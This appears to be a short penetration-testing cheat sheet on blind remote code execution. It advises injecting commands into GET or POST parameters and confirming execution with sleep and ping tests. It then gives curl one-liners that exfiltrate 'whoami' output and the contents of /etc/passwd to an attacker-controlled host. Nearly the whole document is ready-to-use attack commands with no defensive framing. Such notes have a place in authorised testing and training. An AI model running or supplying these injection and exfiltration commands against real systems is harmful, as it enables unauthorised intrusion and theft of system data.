# Blind remote code execution

Insert commands in GET or POST parameters.

## Sleep test

`sleep 5`

## Ping test

Use wireshark to pick up ICMP packets. `-c` is required for Linux hosts.

`ping <LOCAL_IP> -c 5`

## Curl exfiltration

```
curl http://<LOCAL_IP>/`whoami`
```

```
curl -X POST http://<LOCAL_IP>/ --data "`cat /etc/passwd`"
```